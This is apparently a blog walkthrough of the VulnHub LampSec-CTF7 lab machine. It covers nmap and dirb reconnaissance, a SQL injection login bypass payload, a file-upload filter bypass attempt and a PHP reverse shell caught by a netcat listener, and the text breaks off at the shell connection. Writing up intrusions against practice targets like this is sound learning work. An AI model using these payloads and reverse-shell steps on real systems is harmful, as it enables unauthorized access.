<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  LampSec-CTF7 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF7</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T08:08:17.000Z" id="date"> 2023-05-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:31.367Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">4.2k</div></span><br><span>Read Time: <div class="control">24 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/431ef4c15c924ca9deb0561a86d7d35034144840.jpg'><img src="/pic/431ef4c15c924ca9deb0561a86d7d35034144840.jpg" alt="431ef4c15c924ca9deb0561a86d7d35034144840"></p>
<span id="more"></span>

<h2 id="靶机部署"><a href="#靶机部署" class="headerlink" title="靶机部署"></a>靶机部署</h2><p>这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是<code>ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名</code>。然后<code>service network restart</code>就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用<code>systemctl</code>)<br>其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.0014s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.2<br>Host is up (0.0010s latency).<br>MAC Address: 00:50:56:EC:CE:9E (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.00089s latency).<br>MAC Address: 00:0C:29:AC:12:E4 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.254<br>Host is up (0.00060s latency).<br>MAC Address: 00:50:56:E6:06:A3 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.132<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.02 seconds<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.141<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.0011s latency).<br>Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)<br>PORT      STATE  SERVICE<br>22/tcp    open   ssh<br>80/tcp    open   http<br>137/tcp   closed netbios-ns<br>138/tcp   closed netbios-dgm<br>139/tcp   open   netbios-ssn<br>901/tcp   open   samba-swat<br>5900/tcp  closed vnc<br>8080/tcp  open   http-proxy<br>10000/tcp open   snet-sensor-mgmt<br>MAC Address: 00:0C:29:AC:12:E4 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.48 seconds<br></code></pre></td></tr></table></figure>

<p>还开了挺多端口的，80，8080，139，10000都可以看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.141<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:39 CST<br>Warning: 192.168.56.141 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.0019s latency).<br>All 65535 scanned ports on 192.168.56.141 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)<br>MAC Address: 00:0C:29:AC:12:E4 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 72.81 seconds<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.141<br>Host is up (0.00058s latency).<br><br>PORT      STATE  SERVICE     VERSION<br>22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)<br>80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))<br>137/tcp   closed netbios-ns<br>138/tcp   closed netbios-dgm<br>139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901/tcp   open   http        Samba SWAT administration server<br>5900/tcp  closed vnc<br>8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))<br>10000/tcp open   http        MiniServ 1.610 (Webmin httpd)<br>MAC Address: 00:0C:29:AC:12:E4 (VMware)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.13<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 43.12 seconds<br></code></pre></td></tr></table></figure>

<p>趁其它还在扫描的时间先看看80端口吧。</p>
<h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>先目录发现一下，扫描的同时自己手动看看网页。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo dirb http://192.168.56.141                                                                                <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Tue May  2 22:34:27 2023<br>URL_BASE: http://192.168.56.141/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br></code></pre></td></tr></table></figure>

<p>随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。<br class='item-img' data-src='/pic/assets/1683102250882-278d183f-2368-4cb6-8473-31466803b83b.png'><img src="/pic/assets/1683102250882-278d183f-2368-4cb6-8473-31466803b83b.png" alt="sqli-1.png"><br class='item-img' data-src='/pic/assets/sqli-2.png'><img src="/pic/assets/sqli-2.png" alt="sqli-2"><br class='item-img' data-src='/pic/assets/1683102281858-ef2fe860-798c-44e9-bfd0-840ee389f83a.png'><img src="/pic/assets/1683102281858-ef2fe860-798c-44e9-bfd0-840ee389f83a.png" alt="sqli-login.png"></p>
<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>加点<code>&#39;</code>看看有何反应。<br class='item-img' data-src='/pic/assets/1683103622318-fce16b63-3c49-4e62-8134-dbcc0a32292d.png'><img src="/pic/assets/1683103622318-fce16b63-3c49-4e62-8134-dbcc0a32292d.png" alt="sqli-1-re.png"><br class='item-img' data-src='/pic/assets/1683103629581-9ab5c6f0-d1ff-4eb8-936c-25e5eb1c8ba3.png'><img src="/pic/assets/1683103629581-9ab5c6f0-d1ff-4eb8-936c-25e5eb1c8ba3.png" alt="sqli-2-re.png"><br>OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。<br>再在登录页面试试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 192.168.56.141:8080<br>admin<br>&#x27;) or 1=1 #-- -<br></code></pre></td></tr></table></figure>

<p>竟然直接登进来了。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。<br class='item-img' data-src='/pic/assets/1683104068273-b08dd1c6-89e1-4894-9f97-f8a900786c57.png'><img src="/pic/assets/1683104068273-b08dd1c6-89e1-4894-9f97-f8a900786c57.png" alt="image.png">Fortunetly, we find the way to upload files.<br class='item-img' data-src='/pic/assets/1683104101704-4d3fa436-13b6-4275-8e20-191c19fda73c.png'><img src="/pic/assets/1683104101704-4d3fa436-13b6-4275-8e20-191c19fda73c.png" alt="image.png"><br>We try our PoC of upload vuln.<br class='item-img' data-src='/pic/assets/1683105006509-efcbfa09-df3b-4568-b950-959ed39623f4.png'><img src="/pic/assets/1683105006509-efcbfa09-df3b-4568-b950-959ed39623f4.png" alt="filter.png"><br>Seems that the <code>&lt;?</code>and<code>?&gt;</code> are filtered. However, even if we try to bypass the filter like <code>&lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;</code>, the payload just doesn’t work.<br>As a result, we must find the path of the uploaded shell.<br>Oh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo dirb http://192.168.56.141                                                                                <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Tue May  2 22:34:27 2023<br>URL_BASE: http://192.168.56.141/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.56.141/ ----<br>+ http://192.168.56.141/about (CODE:200|SIZE:4910)                                                                          <br>==&gt; DIRECTORY: http://192.168.56.141/assets/                                                                                <br>+ http://192.168.56.141/backups (CODE:301|SIZE:333)                                                                         <br>+ http://192.168.56.141/cgi-bin/ (CODE:403|SIZE:290)                                                                        <br>+ http://192.168.56.141/contact (CODE:200|SIZE:5017)                                                                        <br>==&gt; DIRECTORY: http://192.168.56.141/css/                                                                                   <br>+ http://192.168.56.141/db (CODE:200|SIZE:3904)                                                                             <br>+ http://192.168.56.141/default (CODE:200|SIZE:6058)                                                                        <br>+ http://192.168.56.141/footer (CODE:200|SIZE:3904)                                                                         <br>+ http://192.168.56.141/header (CODE:200|SIZE:3904)                                                                         <br>==&gt; DIRECTORY: http://192.168.56.141/img/                                                                                   <br>==&gt; DIRECTORY: http://192.168.56.141/inc/                                                                                   <br>+ http://192.168.56.141/index.php (CODE:200|SIZE:6058)                                                                      <br>==&gt; DIRECTORY: http://192.168.56.141/js/                                                                                    <br>+ http://192.168.56.141/newsletter (CODE:200|SIZE:4037)                                                                     <br>+ http://192.168.56.141/phpinfo (CODE:200|SIZE:58762)                                                                       <br>+ http://192.168.56.141/profile (CODE:200|SIZE:3977)                                                                        <br>+ http://192.168.56.141/read (CODE:302|SIZE:1)                                                                              <br>+ http://192.168.56.141/recovery (CODE:200|SIZE:4807)                                                                       <br>+ http://192.168.56.141/register (CODE:200|SIZE:6591)                                                                       <br>+ http://192.168.56.141/signup (CODE:200|SIZE:4783)                                                                         <br>+ http://192.168.56.141/usage (CODE:403|SIZE:287)                                                                           <br>==&gt; DIRECTORY: http://192.168.56.141/webalizer/                                                                             <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/                                                                               <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/assets/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/css/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/img/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/inc/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/js/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webalizer/ ----<br>+ http://192.168.56.141/webalizer/index.html (CODE:200|SIZE:3671)                                                           <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/ ----<br>+ http://192.168.56.141/webmail/bin (CODE:403|SIZE:293)                                                                     <br>+ http://192.168.56.141/webmail/config (CODE:403|SIZE:296)                                                                  <br>+ http://192.168.56.141/webmail/favicon.ico (CODE:200|SIZE:1150)                                                            <br>+ http://192.168.56.141/webmail/index.php (CODE:200|SIZE:5157)                                                              <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     <br>+ http://192.168.56.141/webmail/LICENSE (CODE:403|SIZE:297)                                                                 <br>+ http://192.168.56.141/webmail/logs (CODE:403|SIZE:294)                                                                    <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/program/                                                                       <br>+ http://192.168.56.141/webmail/README (CODE:403|SIZE:296)                                                                  <br>+ http://192.168.56.141/webmail/robots.txt (CODE:200|SIZE:26)                                                               <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         <br>+ http://192.168.56.141/webmail/SQL (CODE:403|SIZE:293)                                                                     <br>+ http://192.168.56.141/webmail/temp (CODE:403|SIZE:294)                                                                    <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/installer/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              <br>+ http://192.168.56.141/webmail/installer/index.php (CODE:302|SIZE:0)                                                       <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                              <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/program/ ----<br>(!) WARNING: All responses <span class="hljs-keyword">for</span> this directory seem to be CODE = 403.                                                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                 <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                         <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                            <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      <br>+ http://192.168.56.141/webmail/plugins/password/README (CODE:200|SIZE:10645)                                               <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        <br>+ http://192.168.56.141/webmail/skins/classic/README (CODE:200|SIZE:855)                                                    <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                       <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                 <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                    <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  <br>+ http://192.168.56.141/webmail/skins/classic/images/favicon.ico (CODE:200|SIZE:1150)                                       <br>==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                    <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----<br>==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                          <br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----<br>                                                                                                                            <br>---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----<br>                                                                               /zt                                          <br>-----------------<br>END_TIME: Tue May  2 22:39:31 2023<br>DOWNLOADED: 124624 - FOUND: 32<br></code></pre></td></tr></table></figure>

<p>After some munal try, we find out upload file in the path of <code>192.168.56.141/assets/</code>.<br>So we upload php-reverse-shell.<br class='item-img' data-src='/pic/assets/1683104766103-c2b81916-4b5d-43e7-b28d-9d0879519b99.png'><img src="/pic/assets/1683104766103-c2b81916-4b5d-43e7-b28d-9d0879519b99.png" alt="image.png">And we curl our <code>shell.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl http://192.168.56.141/assets/shell.php</span><br>┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]<br>└─$ sudo nc -lvp 443                                                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>192.168.56.141: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.132] from (UNKNOWN) [192.168.56.141] 48031<br>Linux localhost.localdomain 